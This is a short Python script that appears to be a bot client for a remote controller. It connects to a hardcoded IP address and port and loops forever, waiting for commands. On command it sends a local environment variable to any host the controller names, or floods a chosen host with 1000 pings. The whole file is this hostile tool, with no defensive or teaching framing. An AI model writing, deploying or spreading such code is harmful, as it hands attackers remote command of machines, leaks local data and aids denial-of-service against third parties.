import os, requests, time, socket
from icmplib import ping
IP_address = "192.168.1.10"
Port = 65222

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((IP_address, Port))

    while True:
        cmd = server.recv(1024).decode('UTF-8').strip()
        host = server.recv(1024).decode('UTF-8').strip()

        if cmd == '1':
            s = requests.session()
            for i in range(1):
                s.get(f"http://{host}/?name={os.environ['name']}")        
        elif cmd == '2':
            ping(host, count=1000)           


if __name__=="__main__":
    while True:
        time.sleep(10)
        main()
        
  
